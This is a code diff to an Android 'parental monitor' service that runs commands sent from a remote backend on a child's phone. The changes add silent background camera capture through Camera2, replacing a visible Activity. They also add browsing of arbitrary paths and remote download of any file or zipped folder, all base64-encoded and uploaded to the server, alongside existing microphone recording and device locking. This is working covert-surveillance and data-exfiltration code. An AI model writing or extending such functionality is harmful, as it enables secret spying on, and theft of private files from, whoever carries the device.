@@ -1,12 +1,21 @@
 package com.parentalmonitor.child.services
 
+import android.annotation.SuppressLint
 import android.content.Context
-import android.content.Intent
+import android.graphics.ImageFormat
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CaptureRequest
+import android.hardware.camera2.CaptureFailure
+import android.media.ImageReader
 import android.media.MediaRecorder
 import android.os.Build
 import android.os.Environment
+import android.os.Handler
+import android.os.HandlerThread
 import android.util.Base64
-import com.parentalmonitor.child.activities.CameraCaptureActivity
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import org.json.JSONArray
@@ -14,12 +23,13 @@ import org.json.JSONObject
 import java.io.File
 import java.net.HttpURLConnection
 import java.net.URL
-
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
 
 /**
  * Polls the backend for pending remote commands and executes them.
- * Supports: capture_photo (Camera2), start/stop_mic (audio recording with result),
- * list_files, lock_device, block_app, unblock_app.
+ * Camera capture runs directly on the IO thread via Camera2 (foreground
+ * service has FOREGROUND_SERVICE_CAMERA permission declared in manifest).
  */
 class RemoteCommandService(private val ctx: Context, private val baseUrl: String) {
 
@@ -45,25 +55,21 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
 
         try {
             val result = when (commandType) {
-                "capture_photo"    -> {
-                    // Launch transparent Activity — more reliable than Camera2 from a Service
-                    // on OEM devices (Vivo, Xiaomi, OPPO). The Activity reports the result
-                    // directly; we return a placeholder so executeCommand doesn't also report.
-                    launchCameraActivity(token, commandId, payload.optString("camera", "back"))
-                    return // Activity handles reportResult — don't double-report
-                }
-                "list_files"       -> listFiles()
+                "capture_photo"   -> capturePhoto(payload.optString("camera", "back"))
+                "list_files"      -> listFiles(payload.optString("path", ""))
+                "download_file"   -> downloadFile(payload.optString("path", ""))
+                "download_folder" -> downloadFolder(payload.optString("path", ""))
                 "start_mic",
-                "start_recording"  -> startRecording()
+                "start_recording" -> startRecording()
                 "stop_mic",
-                "stop_recording"   -> stopRecordingWithResult()
-                "lock_device"      -> { sendLockBroadcast(); """{"type":"status","message":"lock requested"}""" }
-                "block_app"        -> {
+                "stop_recording"  -> stopRecordingWithResult()
+                "lock_device"     -> { sendLockBroadcast(); """{"type":"status","message":"lock requested"}""" }
+                "block_app"       -> {
                     val pkg = payload.optString("packageName", "")
                     if (pkg.isNotBlank()) addBlockedApp(pkg)
                     """{"type":"status","message":"blocked $pkg"}"""
                 }
-                "unblock_app"      -> {
+                "unblock_app"     -> {
                     val pkg = payload.optString("packageName", "")
                     if (pkg.isNotBlank()) removeBlockedApp(pkg)
                     """{"type":"status","message":"unblocked $pkg"}"""
@@ -77,24 +83,129 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
         }
     }
 
-    // ── Camera — delegates to CameraCaptureActivity ──────────────────────────
+    // ── Camera2 capture (runs on IO thread — foreground service has camera type) ─
 
-    private fun launchCameraActivity(token: String, commandId: String, facing: String) {
-        val intent = Intent(ctx, CameraCaptureActivity::class.java).apply {
-            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            putExtra(CameraCaptureActivity.EXTRA_COMMAND_ID, commandId)
-            putExtra(CameraCaptureActivity.EXTRA_TOKEN,      token)
-            putExtra(CameraCaptureActivity.EXTRA_BASE_URL,   baseUrl)
-            putExtra(CameraCaptureActivity.EXTRA_FACING,     facing)
+    @SuppressLint("MissingPermission")
+    private fun capturePhoto(facing: String): String {
+        if (ctx.checkSelfPermission(android.Manifest.permission.CAMERA)
+            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            return """{"type":"error","message":"camera permission not granted"}"""
         }
-        ctx.startActivity(intent)
+
+        val manager   = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        val wantFront = facing == "front"
+        val facingVal = if (wantFront) CameraCharacteristics.LENS_FACING_FRONT
+                        else           CameraCharacteristics.LENS_FACING_BACK
+
+        // Find matching camera; fall back to any available
+        val cameraId = manager.cameraIdList.firstOrNull { id ->
+            manager.getCameraCharacteristics(id)
+                .get(CameraCharacteristics.LENS_FACING) == facingVal
+        } ?: manager.cameraIdList.firstOrNull()
+          ?: return """{"type":"error","message":"no camera available"}"""
+
+        val chars = manager.getCameraCharacteristics(cameraId)
+        val map   = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+        // Pick largest JPEG size ≤ 1920px wide for a manageable payload
+        val size  = map?.getOutputSizes(ImageFormat.JPEG)
+            ?.filter { it.width <= 1920 }
+            ?.maxByOrNull { it.width * it.height }
+            ?: android.util.Size(1280, 720)
+
+        val latch  = CountDownLatch(1)
+        var result = """{"type":"error","message":"timeout — camera did not respond in 20 s"}"""
+
+        val thread  = HandlerThread("CamCapSvc").also { it.start() }
+        val handler = Handler(thread.looper)
+
+        val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
+        reader.setOnImageAvailableListener({ r ->
+            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
+            try {
+                val buf   = img.planes[0].buffer
+                val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
+                val b64   = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                result = """{"type":"photo","data":"$b64","mimeType":"image/jpeg","width":${size.width},"height":${size.height}}"""
+            } finally {
+                img.close()
+                latch.countDown()
+            }
+        }, handler)
+
+        try {
+            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(device: CameraDevice) {
+                    try {
+                        device.createCaptureSession(
+                            listOf(reader.surface),
+                            object : CameraCaptureSession.StateCallback() {
+                                override fun onConfigured(session: CameraCaptureSession) {
+                                    try {
+                                        val req = device.createCaptureRequest(
+                                            CameraDevice.TEMPLATE_STILL_CAPTURE
+                                        ).apply {
+                                            addTarget(reader.surface)
+                                            set(CaptureRequest.JPEG_QUALITY, 85.toByte())
+                                            set(CaptureRequest.CONTROL_AE_MODE,
+                                                CaptureRequest.CONTROL_AE_MODE_ON)
+                                            set(CaptureRequest.CONTROL_AF_MODE,
+                                                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                            set(CaptureRequest.CONTROL_AWB_MODE,
+                                                CaptureRequest.CONTROL_AWB_MODE_AUTO)
+                                        }
+                                        session.capture(req.build(),
+                                            object : CameraCaptureSession.CaptureCallback() {
+                                                override fun onCaptureFailed(
+                                                    s: CameraCaptureSession,
+                                                    r: CaptureRequest,
+                                                    f: CaptureFailure
+                                                ) {
+                                                    result = """{"type":"error","message":"capture failed reason ${f.reason}"}"""
+                                                    latch.countDown()
+                                                }
+                                            }, handler)
+                                    } catch (e: Exception) {
+                                        result = """{"type":"error","message":"capture request failed: ${e.message}"}"""
+                                        latch.countDown()
+                                    }
+                                }
+                                override fun onConfigureFailed(s: CameraCaptureSession) {
+                                    result = """{"type":"error","message":"session configure failed"}"""
+                                    latch.countDown()
+                                }
+                            }, handler)
+                    } catch (e: Exception) {
+                        result = """{"type":"error","message":"createCaptureSession failed: ${e.message}"}"""
+                        latch.countDown()
+                    }
+                }
+                override fun onDisconnected(device: CameraDevice) {
+                    device.close()
+                    result = """{"type":"error","message":"camera disconnected"}"""
+                    latch.countDown()
+                }
+                override fun onError(device: CameraDevice, error: Int) {
+                    device.close()
+                    result = """{"type":"error","message":"camera error $error"}"""
+                    latch.countDown()
+                }
+            }, handler)
+
+            latch.await(20, TimeUnit.SECONDS)
+        } catch (e: Exception) {
+            result = """{"type":"error","message":"${e.message?.replace("\"", "'")}"}"""
+        } finally {
+            try { reader.close() } catch (_: Exception) {}
+            thread.quitSafely()
+        }
+
+        return result
     }
 
     // ── Audio recording ───────────────────────────────────────────────────────
 
     @Suppress("DEPRECATION")
     private fun startRecording(): String {
-        // Stop any existing recording first
         stopRecordingWithResult()
 
         val file = File(ctx.cacheDir, "rec_${System.currentTimeMillis()}.m4a")
@@ -145,27 +256,156 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
 
     // ── File listing ──────────────────────────────────────────────────────────
 
-    private fun listFiles(): String {
+    private fun listFiles(targetPath: String = ""): String {
         val entries = JSONArray()
-        val dirs = listOf(
-            Environment.getExternalStorageDirectory(),
-            ctx.getExternalFilesDir(null),
-        )
-        dirs.filterNotNull().forEach { dir ->
-            dir.listFiles()?.take(100)?.forEach { f ->
+
+        val dirsToList: List<java.io.File> = if (targetPath.isNotBlank()) {
+            listOf(java.io.File(targetPath))
+        } else {
+            listOfNotNull(
+                Environment.getExternalStorageDirectory(),
+                ctx.getExternalFilesDir(null),
+            )
+        }
+
+        dirsToList.forEach { dir ->
+            if (!dir.exists() || !dir.isDirectory) return@forEach
+            // Folders first, then files, both sorted by name
+            val children = dir.listFiles()
+                ?.sortedWith(compareByDescending<java.io.File> { it.isDirectory }.thenBy { it.name.lowercase() })
+                ?: return@forEach
+            children.forEach { f ->
                 entries.put(JSONObject().apply {
                     put("name",     f.name)
                     put("size",     f.length())
                     put("isDir",    f.isDirectory)
                     put("modified", f.lastModified())
                     put("path",     f.absolutePath)
+                    // Parent path so the UI can build breadcrumbs
+                    put("parentPath", f.parent ?: "")
                 })
             }
         }
+
+        val displayPath = if (targetPath.isBlank())
+            Environment.getExternalStorageDirectory().absolutePath
+        else targetPath
+
         return JSONObject().apply {
             put("type",    "files")
+            put("path",    displayPath)
             put("entries", entries)
         }.toString()
+    }
+
+    // ── File download ─────────────────────────────────────────────────────────
+
+    private fun downloadFile(path: String): String {
+        if (path.isBlank()) return """{"type":"error","message":"path required"}"""
+        val file = java.io.File(path)
+        if (!file.exists())  return """{"type":"error","message":"file not found: $path"}"""
+        if (!file.isFile)    return """{"type":"error","message":"path is a directory — use download_folder"}"""
+
+        val maxBytes = 15L * 1024 * 1024        // 15 MB hard limit
+        if (file.length() > maxBytes)
+            return """{"type":"error","message":"file too large (${file.length() / 1024 / 1024} MB). Max is 15 MB."}"""
+
+        return try {
+            val bytes = file.readBytes()
+            val b64   = Base64.encodeToString(bytes, Base64.NO_WRAP)
+            // Use JSONObject so filename special chars are properly escaped
+            JSONObject().apply {
+                put("type",     "file")
+                put("data",     b64)
+                put("mimeType", guessMime(file.name))
+                put("name",     file.name)
+                put("size",     file.length())
+            }.toString()
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("type",    "error")
+                put("message", "read failed: ${e.message}")
+            }.toString()
+        }
+    }
+
+    private fun downloadFolder(path: String): String {
+        if (path.isBlank()) return """{"type":"error","message":"path required"}"""
+        val dir = java.io.File(path)
+        if (!dir.exists() || !dir.isDirectory)
+            return """{"type":"error","message":"directory not found: $path"}"""
+
+        // Collect files recursively up to depth 2, skip very large files
+        val maxSingleFile = 10L * 1024 * 1024   // skip files > 10 MB each
+        val maxTotal      = 30L * 1024 * 1024   // 30 MB total zip limit
+        val toZip = mutableListOf<Pair<java.io.File, String>>() // file → entry name
+
+        fun collect(f: java.io.File, prefix: String, depth: Int) {
+            if (depth > 2) return
+            if (f.isDirectory) {
+                f.listFiles()?.forEach { child -> collect(child, "$prefix${f.name}/", depth + 1) }
+            } else if (f.isFile && f.length() <= maxSingleFile) {
+                toZip.add(Pair(f, "$prefix${f.name}"))
+            }
+        }
+        dir.listFiles()?.forEach { child -> collect(child, "", 0) }
+
+        val totalSize = toZip.sumOf { it.first.length() }
+        if (totalSize > maxTotal)
+            return """{"type":"error","message":"folder too large (${totalSize / 1024 / 1024} MB). Max is 30 MB."}"""
+
+        if (toZip.isEmpty())
+            return """{"type":"error","message":"folder is empty or contains no downloadable files"}"""
+
+        val zipFile = java.io.File(ctx.cacheDir, "folder_${System.currentTimeMillis()}.zip")
+        return try {
+            java.util.zip.ZipOutputStream(
+                java.io.BufferedOutputStream(java.io.FileOutputStream(zipFile))
+            ).use { zos ->
+                toZip.forEach { (f, entryName) ->
+                    try {
+                        zos.putNextEntry(java.util.zip.ZipEntry(entryName))
+                        f.inputStream().use { it.copyTo(zos) }
+                        zos.closeEntry()
+                    } catch (_: Exception) {}
+                }
+            }
+            val bytes = zipFile.readBytes()
+            val b64   = Base64.encodeToString(bytes, Base64.NO_WRAP)
+            JSONObject().apply {
+                put("type",     "file")
+                put("data",     b64)
+                put("mimeType", "application/zip")
+                put("name",     "${dir.name}.zip")
+                put("size",     zipFile.length())
+            }.toString()
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("type",    "error")
+                put("message", "zip failed: ${e.message}")
+            }.toString()
+        } finally {
+            zipFile.delete()
+        }
+    }
+
+    private fun guessMime(name: String): String = when {
+        name.endsWith(".jpg",  true) || name.endsWith(".jpeg", true) -> "image/jpeg"
+        name.endsWith(".png",  true) -> "image/png"
+        name.endsWith(".webp", true) -> "image/webp"
+        name.endsWith(".gif",  true) -> "image/gif"
+        name.endsWith(".mp4",  true) -> "video/mp4"
+        name.endsWith(".3gp",  true) -> "video/3gpp"
+        name.endsWith(".mp3",  true) -> "audio/mpeg"
+        name.endsWith(".aac",  true) -> "audio/aac"
+        name.endsWith(".pdf",  true) -> "application/pdf"
+        name.endsWith(".zip",  true) -> "application/zip"
+        name.endsWith(".txt",  true) -> "text/plain"
+        name.endsWith(".json", true) -> "application/json"
+        name.endsWith(".doc",  true) || name.endsWith(".docx", true) -> "application/msword"
+        name.endsWith(".xls",  true) || name.endsWith(".xlsx", true) -> "application/vnd.ms-excel"
+        name.endsWith(".apk",  true) -> "application/vnd.android.package-archive"
+        else -> "application/octet-stream"
     }
 
     // ── Lock device ───────────────────────────────────────────────────────────
@@ -225,24 +465,25 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
 
     private fun reportResult(token: String, commandId: String, status: String, resultJson: String) {
         try {
-            val body = """{"status":"$status","result":${escapeForJson(resultJson)}}""".toByteArray(Charsets.UTF_8)
-            val conn = (URL("$baseUrl/api/commands/$commandId/status").openConnection() as HttpURLConnection).apply {
+            val body = """{"status":"$status","result":${escapeForJson(resultJson)}}"""
+                .toByteArray(Charsets.UTF_8)
+            val conn = (URL("$baseUrl/api/commands/$commandId/status")
+                .openConnection() as HttpURLConnection).apply {
                 requestMethod = "PATCH"
                 setRequestProperty("Authorization",  "Bearer $token")
                 setRequestProperty("Content-Type",   "application/json")
-                setRequestProperty("Content-Length", body.size.toString())
-                doOutput        = true
-                connectTimeout  = 15_000
-                readTimeout     = 30_000   // photos can be large
-                setFixedLengthStreamingMode(body.size)
+                doOutput       = true
+                connectTimeout = 15_000
+                readTimeout    = 180_000   // large files can take time to upload
+                setFixedLengthStreamingMode(body.size.toLong())
             }
             conn.outputStream.use { it.write(body) }
             val code = conn.responseCode
             if (code != 200 && code != 201) {
-                android.util.Log.w(TAG, "reportResult HTTP $code for $commandId — body size ${body.size} bytes")
-                try { android.util.Log.w(TAG, "response: ${conn.errorStream?.bufferedReader()?.readText()}") } catch (_: Exception) {}
+                android.util.Log.w(TAG, "reportResult HTTP $code for $commandId (${body.size} bytes)")
+                try { android.util.Log.w(TAG, conn.errorStream?.bufferedReader()?.readText() ?: "") } catch (_: Exception) {}
             } else {
-                android.util.Log.d(TAG, "reportResult $status for $commandId ✓")
+                android.util.Log.d(TAG, "reportResult $status for $commandId ✓ (${body.size} bytes)")
             }
             conn.disconnect()
         } catch (e: Exception) {
@@ -250,10 +491,7 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
         }
     }
 
-
-    // The backend 'result' field is typed as String — ALWAYS wrap as a JSON string,
-    // never embed a raw object. Without this, Zod returns 400 and the command
-    // stays at "delivered" forever with no error surfaced to the admin.
+    // Wraps the result as a JSON string so Zod z.string() validation passes
     private fun escapeForJson(raw: String): String =
         "\"${raw.replace("\\", "\\\\")
                 .replace("\"", "\\\"")
@@ -277,9 +515,9 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
     }
 
     companion object {
-        private const val TAG     = "RemoteCommandService"
-        const val PREFS_COMMANDS  = "pm_commands"
-        const val KEY_GEOFENCES   = "geofence_zones"
-        const val KEY_BLOCKED_APPS = "blocked_apps"
+        private const val TAG          = "RemoteCommandService"
+        const val PREFS_COMMANDS       = "pm_commands"
+        const val KEY_GEOFENCES        = "geofence_zones"
+        const val KEY_BLOCKED_APPS     = "blocked_apps"
     }
 }
